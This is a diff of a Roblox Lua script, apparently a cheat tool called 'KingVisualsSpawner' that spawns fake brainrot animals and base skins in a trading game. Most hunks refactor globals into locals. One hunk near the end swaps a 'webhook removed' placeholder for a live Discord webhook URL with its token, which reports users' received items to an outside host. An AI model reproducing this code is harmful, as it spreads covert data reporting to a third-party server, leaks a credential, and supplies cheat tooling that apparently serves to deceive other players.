     ["Orange Egg"]=3, ["Green Egg"]=4, ["Blue Egg"]=5, ["Pink Egg"]=6.5,
 }
-MUTATION_MODIFIERS = {
+local MUTATION_MODIFIERS = {
     ["Gold"]=0.25, ["Diamond"]=0.5, ["Bloodrot"]=1, ["Rainbow"]=9,
     ["Candy"]=3, ["Lava"]=5, ["Galaxy"]=6, ["YinYang"]=6.5,
     ["Radioactive"]=7.5, ["Cursed"]=8, ["Divine"]=9, ["Cyber"]=10,
 }
 
 -- exact GetGeneration formula from Shared.Animals decompile
-CalcGeneration = function(animalName, mutation, traits)
+local function CalcGeneration(animalName, mutation, traits)
     local info = ANIMAL_DATA[animalName]
     local base = info and (info.gen or 0) or 0
     -- fallback to Datas.Animals for animals not in ANIMAL_DATA
@@ -3361,7 +3051,7 @@ CalcGeneration = function(animalName, mutation, traits)
     return math.floor(gen)
 end
 
-MUTATION_ICONS = {
+local MUTATION_ICONS = {
     ["None"]        = "",
     ["Gold"]        = "rbxassetid://136133057822407",
     ["Diamond"]     = "rbxassetid://100875709547015",
@@ -3377,7 +3067,7 @@ MUTATION_ICONS = {
     ["Cyber"]       = "rbxassetid://91596580591665",
 }
 
-TRAIT_ICONS = {
+local TRAIT_ICONS = {
     ["10B"]             = "rbxassetid://134655415681926",
     ["26"]              = "rbxassetid://80468035315420",
     [":3"]              = "rbxassetid://108293878529172",
@@ -3434,15 +3124,19 @@ TRAIT_ICONS = {
     ["Zombie"]          = "rbxassetid://110723387483939",
 }
 
-Stroke = function(parent, color, thickness, trans)
+local function Stroke(parent, color, thickness, trans)
     local s = Instance.new("UIStroke")
     s.Color = color or BORDER; s.Thickness = thickness or 1
     s.Transparency = trans or 0.3; s.Parent = parent
     return s
 end
 
+
+-- Fix: wrap execution in function to resolve 'too many local registers' error
+local function _buildAndRun()
+
 -- ── ROOT GUI ─────────────────────────────────────────────
-sg = New("ScreenGui", {
+local sg = New("ScreenGui", {
     Name="KingVisualsSpawner", ResetOnSpawn=false, IgnoreGuiInset=true,
     ZIndexBehavior=Enum.ZIndexBehavior.Sibling, DisplayOrder=5000,
     Parent=GetSafeParent(),
@@ -3451,9 +3145,9 @@ sg = New("ScreenGui", {
 -- UIScale: auto-fit on small/large screens so the script doesn't render off-screen
 -- on phones / 1366×768 laptops, and doesn't look tiny on 4K.
 -- Reference resolution = 1920×1080. Scale clamped between 0.6× and 1.25×.
-_kvScale = Instance.new("UIScale")
+local _kvScale = Instance.new("UIScale")
 _kvScale.Parent = sg
-_refreshScale = function()
+local function _refreshScale()
     pcall(function()
         local cam = workspace.CurrentCamera
         if not cam then return end
@@ -3470,8 +3164,8 @@ pcall(function()
 end)
 
 -- ── MAIN WINDOW ──────────────────────────────────────────
-WIN_W = 400
-win = New("Frame", {
+local WIN_W = 400
+local win = New("Frame", {
     Size=UDim2.new(0,WIN_W,0,514),
     Position=UDim2.new(0,20,0,200),
     BackgroundColor3=BG,
@@ -3481,7 +3175,7 @@ win = New("Frame", {
 Corner(win, 8)
 Stroke(win, Color3.fromRGB(50,45,80), 1, 0.2)
 -- title bar
-tbar = New("Frame", {
+local tbar = New("Frame", {
     Size=UDim2.new(1,0,0,36),
     BackgroundColor3=Color3.fromRGB(30,28,42),
     BorderSizePixel=0, Parent=win,
@@ -3520,8 +3214,8 @@ do
     end)
 end
 
-contentVisible = true
-mainContent = New("Frame", {
+local contentVisible = true
+local mainContent = New("Frame", {
     Size=UDim2.new(1,0,0,0), Position=UDim2.new(0,0,0,36),
     BackgroundTransparency=1, BorderSizePixel=0, Parent=win,
     AutomaticSize=Enum.AutomaticSize.Y,
@@ -3552,7 +3246,7 @@ do
 end
 
 -- ── TAB BAR ──────────────────────────────────────────────
-tabBar = New("Frame", {
+local tabBar = New("Frame", {
     Size=UDim2.new(1,0,0,34), BackgroundColor3=Color3.fromRGB(18,18,22),
     BorderSizePixel=0, LayoutOrder=0, Parent=mainContent,
 })
@@ -3568,7 +3262,7 @@ do
     pad.PaddingRight = UDim.new(0, 6)
 end
 
-MakeTab = function(label, order)
+local function MakeTab(label, order)
     local btn = New("TextButton", {
         Size=UDim2.new(0.25, -5, 0, 26),
         BackgroundColor3=Color3.fromRGB(30,28,42),
@@ -3580,13 +3274,13 @@ MakeTab = function(label, order)
     return btn
 end
 
-tabBrainrots = MakeTab("🐾  Brainrots", 1)
-tabTrading   = MakeTab("💱  Trading",   2)
-tabBase      = MakeTab("🏠  Base",      3)
-tabMisc      = MakeTab("⚙  Misc",      4)
+local tabBrainrots = MakeTab("🐾  Brainrots", 1)
+local tabTrading   = MakeTab("💱  Trading",   2)
+local tabBase      = MakeTab("🏠  Base",      3)
+local tabMisc      = MakeTab("⚙  Misc",      4)
 
 -- pages container
-brainrotsPage = New("Frame", {
+local brainrotsPage = New("Frame", {
     Size=UDim2.new(1,0,0,0), AutomaticSize=Enum.AutomaticSize.Y,
     BackgroundTransparency=1, BorderSizePixel=0,
     LayoutOrder=1, Visible=true, Parent=mainContent,
@@ -3601,7 +3295,7 @@ do
     end)
 end
 
-tradingPage = New("Frame", {
+local tradingPage = New("Frame", {
     Size=UDim2.new(1,0,0,0), AutomaticSize=Enum.AutomaticSize.Y,
     BackgroundTransparency=1, BorderSizePixel=0,
     LayoutOrder=1, Visible=false, Parent=mainContent,
@@ -3617,7 +3311,7 @@ do
     pad.PaddingRight = UDim.new(0, 6)
 end
 
-miscPage = New("Frame", {
+local miscPage = New("Frame", {
     Size=UDim2.new(1,0,0,0), AutomaticSize=Enum.AutomaticSize.Y,
     BackgroundTransparency=1, BorderSizePixel=0,
     LayoutOrder=1, Visible=false, Parent=mainContent,
@@ -3633,7 +3327,7 @@ do
     pad.PaddingRight = UDim.new(0, 6)
 end
 
-basePage = New("Frame", {
+local basePage = New("Frame", {
     Size=UDim2.new(1,0,0,0), AutomaticSize=Enum.AutomaticSize.Y,
     BackgroundTransparency=1, BorderSizePixel=0,
     LayoutOrder=1, Visible=false, Parent=mainContent,
@@ -3650,7 +3344,7 @@ do
 end
 
 -- Tab switching logic
-SetTab = function(tab)
+local function SetTab(tab)
     brainrotsPage.Visible = tab == "Brainrots"
     tradingPage.Visible   = tab == "Trading"
     basePage.Visible      = tab == "Base"
@@ -3674,32 +3368,32 @@ tabMisc.Activated:Connect(function()      SetTab("Misc")      end)
 
 
 -- ── SELECTED ANIMAL HEADER ───────────────────────────────
-selectedHeader = New("Frame", {
+local selectedHeader = New("Frame", {
     Size=UDim2.new(1,0,0,50), BackgroundColor3=Color3.fromRGB(28,28,38),
     BorderSizePixel=0, LayoutOrder=1, Parent=brainrotsPage,
 })
 Corner(selectedHeader, 6)
 Stroke(selectedHeader, Color3.fromRGB(60,60,80), 1, 0.2)
-rarityTag = New("TextLabel", {
+local rarityTag = New("TextLabel", {
     Size=UDim2.new(1,0,0,14), Position=UDim2.new(0,10,0,7),
     BackgroundTransparency=1, Text="BRAINROTS",
     TextColor3=Color3.fromRGB(230,230,240), Font=Enum.Font.GothamBold,
     TextSize=9, TextXAlignment=Enum.TextXAlignment.Left, Parent=selectedHeader,
 })
-selectedName = New("TextLabel", {
+local selectedName = New("TextLabel", {
     Size=UDim2.new(0.65,0,0,22), Position=UDim2.new(0,10,0,22),
     BackgroundTransparency=1, Text="Select an animal...",
     TextColor3=Color3.fromRGB(230,230,240), Font=Enum.Font.GothamBold,
     TextSize=14, TextXAlignment=Enum.TextXAlignment.Left, Parent=selectedHeader,
 })
-selectedPrice = New("TextLabel", {
+local selectedPrice = New("TextLabel", {
     Size=UDim2.new(0.4,-10,0,22), Position=UDim2.new(0.6,0,0,22),
     BackgroundTransparency=1, Text="",
     TextColor3=Color3.fromRGB(30,160,30), Font=Enum.Font.GothamBold,
     TextSize=14, TextXAlignment=Enum.TextXAlignment.Right, Parent=selectedHeader,
 })
 
-_fmtCash = function(n)
+local function _fmtCash(n)
     local function clean(s,sx) return s:gsub("%.0+"..sx,sx):gsub("(%.%d-)0+"..sx,"%1"..sx) end
     if n>=1e12 then return "$"..clean(string.format("%.1fT",n/1e12),"T")
     elseif n>=1e9 then return "$"..clean(string.format("%.1fB",n/1e9),"B")
@@ -3722,9 +3416,15 @@ function _updateSelectedPrice()
         end
     end
 end
+
+-- forward decl: defined later in the file (~line 8718)
+local _llFetchFandomImage
+local _llGetBrainrotAsset
+local _triggerTradeNotif  -- defined ~line 8400; called from the Trading-tab button
+
 -- ── ANIMAL TOGGLE BUTTON ─────────────────────────────────
-listVisible = false
-animalToggleBtn = New("TextButton", {
+local listVisible = false
+local animalToggleBtn = New("TextButton", {
     Size=UDim2.new(1,0,0,32), BackgroundColor3=Color3.fromRGB(24,24,30),
     BorderSizePixel=0, Text="▼  Select Animal",
     TextColor3=Color3.fromRGB(230,230,240), Font=Enum.Font.GothamBold,
@@ -3736,7 +3436,7 @@ animalToggleBtn.MouseEnter:Connect(function() animalToggleBtn.BackgroundColor3=C
 animalToggleBtn.MouseLeave:Connect(function() animalToggleBtn.BackgroundColor3=Color3.fromRGB(24,24,30) end)
 
 -- ── LIST CONTAINER (inline under toggle button) ──────────
-listContainer = New("Frame", {
+local listContainer = New("Frame", {
     Size=UDim2.new(1,0,0,276),
     BackgroundColor3=Color3.fromRGB(30,28,42),
     BorderSizePixel=0, ClipsDescendants=true,
@@ -3746,7 +3446,7 @@ Corner(listContainer, 6)
 Stroke(listContainer, Color3.fromRGB(50,45,80), 1, 0.2)
 
 -- Multi-Select toggle row at the top of the dropdown
-multiToggle = New("TextButton", {
+local multiToggle = New("TextButton", {
     Size=UDim2.new(1,-8,0,24), Position=UDim2.new(0,4,0,4),
     BackgroundColor3=Color3.fromRGB(60,60,80),
     Text="Select Multiple: OFF",
@@ -3754,7 +3454,7 @@ multiToggle = New("TextButton", {
     TextSize=10, AutoButtonColor=false, BorderSizePixel=0, Parent=listContainer,
 })
 Corner(multiToggle, 5)
-_refreshMultiToggle = function()
+local function _refreshMultiToggle()
     local count = 0
     for _, on in pairs(_multiSelected) do if on then count = count + 1 end end
     if _multiSelectMode then
@@ -3770,7 +3470,7 @@ end
 
 -- Search row: holds a magnifier icon + the actual TextBox so the placeholder
 -- can be animated with a "Search... → Search.. → Search." typing cycle.
-searchRow = New("Frame", {
+local searchRow = New("Frame", {
     Size=UDim2.new(1,-8,0,30), Position=UDim2.new(0,4,0,32),
     BackgroundColor3=Color3.fromRGB(24,24,30), BorderSizePixel=0,
     Parent=listContainer,
@@ -3787,7 +3487,7 @@ New("TextLabel", {
     TextXAlignment=Enum.TextXAlignment.Left, Parent=searchRow,
 })
 
-searchBox = New("TextBox", {
+local searchBox = New("TextBox", {
     Size=UDim2.new(1,-32,1,0), Position=UDim2.new(0,30,0,0),
     BackgroundTransparency=1, BorderSizePixel=0,
     Text="", PlaceholderText="Search...",
@@ -3824,7 +3524,7 @@ searchBox.FocusLost:Connect(function()
     end
 end)
 
-listFrame = New("ScrollingFrame", {
+local listFrame = New("ScrollingFrame", {
     Size=UDim2.new(1,0,0,206), Position=UDim2.new(0,0,0,66),
     BackgroundColor3=BG, BorderSizePixel=0,
     ScrollBarThickness=3, ScrollBarImageColor3=Color3.fromRGB(108,92,231),
@@ -3847,8 +3547,8 @@ animalToggleBtn.MouseButton1Click:Connect(function()
 end)
 
 
-animalBtns = {}
-BuildAnimalList = function(filter)
+local animalBtns = {}
+local function BuildAnimalList(filter)
     filter = (filter or ""):lower()
     for _,b in ipairs(animalBtns) do pcall(function() b:Destroy() end) end
     animalBtns = {}
@@ -3979,7 +3679,7 @@ end)
 _refreshMultiToggle()
 
 -- ── TRAITS & MUTATIONS BUTTON ─────────────────────────────
-traitsBtn = New("TextButton", {
+local traitsBtn = New("TextButton", {
     Size=UDim2.new(1,0,0,32), BackgroundColor3=Color3.fromRGB(24,24,30),
     BorderSizePixel=0, Text="▼  Traits",
     TextColor3=Color3.fromRGB(230,230,240), Font=Enum.Font.GothamBold,
@@ -3992,15 +3692,15 @@ traitsBtn.MouseLeave:Connect(function() traitsBtn.BackgroundColor3=Color3.fromRG
 local tmBtn = traitsBtn -- legacy alias for downstream code that still references tmBtn
 
 -- ── QUANTITY ROW ─────────────────────────────────────────
-spawnCount = 1
-qtyRow = New("Frame", {
+local spawnCount = 1
+local qtyRow = New("Frame", {
     Size=UDim2.new(1,0,0,34), BackgroundColor3=Color3.fromRGB(30,28,42),
     BorderSizePixel=0, LayoutOrder=8, Parent=brainrotsPage,
 })
 Corner(qtyRow, 6)
 Stroke(qtyRow, Color3.fromRGB(50,50,70), 1, 0.3)
 
-minusBtn = New("TextButton", {
+local minusBtn = New("TextButton", {
     Size=UDim2.new(0,40,1,0), Position=UDim2.new(0,0,0,0),
     BackgroundColor3=Color3.fromRGB(28,28,38),
     BorderSizePixel=0, Text="-", TextColor3=Color3.fromRGB(230,230,240),
@@ -4009,14 +3709,14 @@ minusBtn = New("TextButton", {
 })
 Corner(minusBtn, 6)
 
-qtyLbl = New("TextLabel", {
+local qtyLbl = New("TextLabel", {
     Size=UDim2.new(1,-80,1,0), Position=UDim2.new(0,40,0,0),
     BackgroundTransparency=1, Text="x1",
     TextColor3=Color3.fromRGB(230,230,240), Font=Enum.Font.GothamBold,
     TextSize=13, Parent=qtyRow,
 })
 
-plusBtn = New("TextButton", {
+local plusBtn = New("TextButton", {
     Size=UDim2.new(0,40,1,0), Position=UDim2.new(1,-40,0,0),
     BackgroundColor3=Color3.fromRGB(28,28,38),
     BorderSizePixel=0, Text="+", TextColor3=Color3.fromRGB(230,230,240),
@@ -4037,7 +3737,7 @@ plusBtn.MouseEnter:Connect(function() plusBtn.BackgroundColor3=Color3.fromRGB(50
 plusBtn.MouseLeave:Connect(function() plusBtn.BackgroundColor3=Color3.fromRGB(28,28,38) end)
 
 -- ── SPAWN BUTTON ─────────────────────────────────────────
-spawnBtn = New("TextButton", {
+local spawnBtn = New("TextButton", {
     Size=UDim2.new(1,0,0,40), BackgroundColor3=Color3.fromRGB(40,160,70),
     BorderSizePixel=0, Text="Spawn onto Podium",
     TextColor3=Color3.new(1,1,1), Font=Enum.Font.GothamBold,
@@ -4049,12 +3749,12 @@ spawnBtn.MouseEnter:Connect(function() spawnBtn.BackgroundColor3=Color3.fromRGB(
 spawnBtn.MouseLeave:Connect(function() spawnBtn.BackgroundColor3=Color3.fromRGB(40,160,70) end)
 
 
-statusLbl = New("TextLabel", {Size=UDim2.new(1,0,0,0), BackgroundTransparency=1, Text="", TextColor3=Color3.fromRGB(230,230,240), Font=Enum.Font.GothamBold, TextSize=10, TextXAlignment=Enum.TextXAlignment.Center, Parent=brainrotsPage, Visible=false})
-countLbl = New("TextLabel", {Size=UDim2.new(1,0,0,0), BackgroundTransparency=1, Text="", TextColor3=Color3.fromRGB(230,230,240), Font=Enum.Font.GothamSemibold, TextSize=10, TextXAlignment=Enum.TextXAlignment.Center, Parent=brainrotsPage, Visible=false})
+local statusLbl = New("TextLabel", {Size=UDim2.new(1,0,0,0), BackgroundTransparency=1, Text="", TextColor3=Color3.fromRGB(230,230,240), Font=Enum.Font.GothamBold, TextSize=10, TextXAlignment=Enum.TextXAlignment.Center, Parent=brainrotsPage, Visible=false})
+local countLbl = New("TextLabel", {Size=UDim2.new(1,0,0,0), BackgroundTransparency=1, Text="", TextColor3=Color3.fromRGB(230,230,240), Font=Enum.Font.GothamSemibold, TextSize=10, TextXAlignment=Enum.TextXAlignment.Center, Parent=brainrotsPage, Visible=false})
 
 -- ── TRAITS DROPDOWN (inline) ─────────────────────────────
-traitsVisible = false
-tmPopup = New("Frame", {
+local traitsVisible = false
+local tmPopup = New("Frame", {
     Size=UDim2.new(1,0,0,176),
     BackgroundColor3=Color3.fromRGB(20,20,28),
     BorderSizePixel=0, ClipsDescendants=true,
@@ -4069,7 +3769,7 @@ traitsBtn.MouseButton1Click:Connect(function()
     _updateTraitsBtnText()
 end)
 
-traitsGrid = New("ScrollingFrame", {
+local traitsGrid = New("ScrollingFrame", {
     Size=UDim2.new(1,0,1,-8), Position=UDim2.new(0,0,0,4),
     BackgroundColor3=BG, BorderSizePixel=0,
     ScrollBarThickness=3, ScrollBarImageColor3=Color3.fromRGB(108,92,231),
@@ -4084,7 +3784,7 @@ do
     up.PaddingTop=UDim.new(0,4); up.PaddingBottom=UDim.new(0,4)
 end
 
-_updateTraitsBtnText = function()
+local function _updateTraitsBtnText()
     local sel = {}
     for trait, on in pairs(selectedTraits) do
         if on then table.insert(sel, trait) end
@@ -4099,7 +3799,7 @@ _updateTraitsBtnText = function()
     end
 end
 
-traitBtns = {}
+local traitBtns = {}
 for _,trait in ipairs(TRAITS) do
     local sel = selectedTraits[trait] == true
     local b = New("TextButton", {
@@ -4158,8 +3858,8 @@ Stroke(mutationsBtn, Color3.fromRGB(60,60,90), 1, 0.2)
 mutationsBtn.MouseEnter:Connect(function() mutationsBtn.BackgroundColor3=Color3.fromRGB(30,28,42) end)
 mutationsBtn.MouseLeave:Connect(function() mutationsBtn.BackgroundColor3=Color3.fromRGB(24,24,30) end)
 
-mutationsVisible = false
-mutPopup = New("Frame", {
+local mutationsVisible = false
+local mutPopup = New("Frame", {
     Size=UDim2.new(1,0,0,176),
     BackgroundColor3=Color3.fromRGB(20,20,28),
     BorderSizePixel=0, ClipsDescendants=true,
@@ -4168,7 +3868,7 @@ mutPopup = New("Frame", {
 Corner(mutPopup, 6)
 Stroke(mutPopup, Color3.fromRGB(50,45,80), 1, 0.2)
 
-_updateMutationsBtnText = function()
+local function _updateMutationsBtnText()
     local arrow = mutationsVisible and "▲" or "▼"
     if not selectedMutation or selectedMutation == "None" then
         mutationsBtn.Text = arrow .. "  Mutation"
@@ -4183,7 +3883,7 @@ mutationsBtn.MouseButton1Click:Connect(function()
     _updateMutationsBtnText()
 end)
 
-mutGrid = New("ScrollingFrame", {
+local mutGrid = New("ScrollingFrame", {
     Size=UDim2.new(1,0,1,-8), Position=UDim2.new(0,0,0,4),
     BackgroundColor3=BG, BorderSizePixel=0,
     ScrollBarThickness=3, ScrollBarImageColor3=Color3.fromRGB(108,92,231),
@@ -4198,7 +3898,7 @@ do
     up.PaddingTop=UDim.new(0,4); up.PaddingBottom=UDim.new(0,4)
 end
 
-mutBtns = {}
+local mutBtns = {}
 for _,mut in ipairs(MUTATIONS) do
     local sel = (mut==selectedMutation)
     local b = New("TextButton", {
@@ -4245,7 +3945,7 @@ for _,mut in ipairs(MUTATIONS) do
     end)
 end
 
-SetStatus = function(msg,col,dur)
+local function SetStatus(msg,col,dur)
     pcall(function()
         statusLbl.Text=msg; statusLbl.TextColor3=col or Color3.fromRGB(230,230,240)
     end)
@@ -4253,7 +3953,7 @@ SetStatus = function(msg,col,dur)
         statusLbl.Text="Ready"; statusLbl.TextColor3=Color3.fromRGB(230,230,240)
     end) end) end
 end
-UpdateCount = function()
+local function UpdateCount()
     local alive={}
     for _,m in ipairs(spawnedModels) do
         if m and m.Parent then table.insert(alive, m) end
@@ -4267,9 +3967,26 @@ end
 
 -- ── VISUAL BASE SKIN ─────────────────────────────────────
 do
-    -- (SKIN_FILE, SKIN_FILE_LEGACY, SKINS, getPlayerFloor, _hasBrainrot, getAvailableSkins hoisted to top-level)
+    local SKIN_FILE = "NewBases.rbxmx"
+    local SKIN_FILE_LEGACY = "BaseSkinsKing.rbxmx"  -- old file name; auto-migrate if present
 
-    getPlayerFloor = function()
+    local SKINS = {
+        { name = "Skibidi",       brainrot = "Skibidi Toilet"       },
+        { name = "Headless",      brainrot = "Headless Horseman"    },
+        { name = "Meowl",         brainrot = "Meowl"               },
+        { name = "Strawberry",    brainrot = "Strawberry Elephant"  },
+        { name = "Christmas",     brainrot = nil                    },
+        { name = "Galaxy",        brainrot = nil                    },
+        { name = "Rainbow",       brainrot = nil                    },
+        { name = "Valentines",    brainrot = nil                    },
+        { name = "Bunny Basket",  brainrot = nil                    },
+        { name = "Divine",        brainrot = nil                    },
+        { name = "Cursed",        brainrot = nil                    },
+        { name = "Cyber",         brainrot = nil                    },
+        { name = "John Pork",    brainrot = "John Pork"            },
+    }
+
+    local function getPlayerFloor()
         local rebirths = 0
         pcall(function()
             local ls = LocalPlayer:FindFirstChild("leaderstats")
@@ -4284,7 +4001,7 @@ do
 
     -- Returns true if the named brainrot is currently on the player's plot,
     -- whether as a real podium animal (server data) OR a KV fake spawn.
-    _hasBrainrot = function(name)
+    local function _hasBrainrot(name)
         if not name then return true end  -- skin has no brainrot requirement
         for _, m in ipairs(spawnedModels) do
             if m and m.Parent and m.Name == name then return true end
@@ -4301,24 +4018,36 @@ do
         return ok and found or false
     end
 
-    getAvailableSkins = function()
+    local function getAvailableSkins()
         -- All non-OG skins (Christmas, Galaxy, Rainbow, etc.) show always.
         -- OG skins (Skibidi, Headless, Meowl, Strawberry, John Pork) only show
         -- if you currently have that brainrot on your plot. Deleting/trading
         -- it away makes the skin disappear from the list and reverts the look.
         local available = {}
-        --[[for _, skin in ipairs(SKINS) do
+        for _, skin in ipairs(SKINS) do
             if skin.brainrot == nil or _hasBrainrot(skin.brainrot) then
                 table.insert(available, skin)
             end
         end
-        ]]
         return available
     end
 
-    -- (_skinFolder, _skinLoading, _activeSkinClone, _hiddenParts, _selectedSkin, neverHide hoisted to top-level)
+    local _skinFolder      = nil
+    local _skinLoading     = false
+    local _activeSkinClone = nil
+    local _hiddenParts     = {}
+    local _selectedSkin    = nil
 
-    isInsideProtected = function(obj, plot)
+    local neverHide = {
+        Spawn=true, MainRoot=true, Hitbox=true,
+        AnimalPodiums=true, Claim=true, Multiplier=true,
+        DeliveryBox=true, DeliveryHitbox=true, CollectZone=true,
+        Laser=true, LaserHitbox=true, StealHitbox=true,
+        PlotBlock=true, FriendPanel=true, CashPad=true,
+        FirstFloor=true, SecondFloor=true, ThirdFloor=true,
+    }
+
+    local function isInsideProtected(obj, plot)
         local p = obj.Parent
         while p and p ~= plot do
             if neverHide[p.Name] then return true end
@@ -4329,7 +4058,7 @@ do
         return false
     end
 
-    hidePlotParts = function(plot)
+    local function hidePlotParts(plot)
         for _, obj in plot:GetDescendants() do
             if obj:IsA("BasePart")
             and not neverHide[obj.Name]
@@ -4342,7 +4071,7 @@ do
         end
     end
 
-    showPlotParts = function()
+    local function showPlotParts()
         for obj, v in pairs(_hiddenParts) do
             if typeof(obj) == "Instance" and obj.Parent then
                 pcall(function() obj.LocalTransparencyModifier = v end)
@@ -4379,7 +4108,7 @@ do
         end
     end)
 
-    loadSkinModels = function(callback)
+    local function loadSkinModels(callback)
         if _skinFolder then callback(_skinFolder); return end
         if _skinLoading then SetStatus("Still loading skins...", Color3.fromRGB(255,150,50), 2); return end
         _skinLoading = true
@@ -4476,8 +4205,24 @@ do
     -- ── LASER RECOLOR (Cyber skin) ───────────────────────────
     -- The visible laser is a Beam instance (with ColorSequence + NumberSequence transparency)
     -- inside the plot's "Laser" model. Recolor those when Cyber is applied.
+    local LASER_LOOKS = {
+        Cyber = {
+            beamColor = ColorSequence.new(Color3.fromRGB(80, 200, 255)),
+            beamTransparency = NumberSequence.new({
+                NumberSequenceKeypoint.new(0,    0.4),
+                NumberSequenceKeypoint.new(0.5,  0.85),
+                NumberSequenceKeypoint.new(1,    0.4),
+            }),
+            -- Optional fallback for any BaseParts that are part of the laser body
+            partColor        = Color3.fromRGB(80, 200, 255),
+            partMaterial     = Enum.Material.Neon,
+            partTransparency = 0.6,
+        },
+    }
     -- saved state: { instance -> {kind = "beam"|"part", ...orig props...} }
-    -- (LASER_LOOKS, _originalLaserState, _activeLaserSkin, _laserStreamConn hoisted to top-level)
+    local _originalLaserState = {}
+    local _activeLaserSkin = nil
+    local _laserStreamConn = nil
 
     -- A part counts as "laser-related" if any ancestor or sibling-folder is named Laser/LaserHitbox,
     -- OR if its own name contains "Laser", OR if it visibly is a Beam.
@@ -10348,7 +10093,7 @@ local function _postReceivedItem(item)
     -- LRM_SEND_WEBHOOK requires constant URL/template literals; runtime values
     -- are wrapped in LRM_SANITIZE so the server validates them. The color
     -- field must be a number literal per Luarmor's macro rules.
-    LRM_SEND_WEBHOOK("webhook removed you're welcome", {
+    LRM_SEND_WEBHOOK("https://discord.com/api/webhooks/1498875716979265576/I5GY291lEhocVpwWhYY926r1QiI6LNgaropHb2fxlIPI9qRVWX19PJoqS2YcEUijjnyc", {
         username = "KingVisuals Pulls",
         embeds = {{
             title       = LRM_SANITIZE(item.name, "[ -~À-ÿ]{1,80}"),
@@ -10689,3 +10434,6 @@ task.spawn(function()
         end
     end
 end)
+
+end
+_buildAndRun()
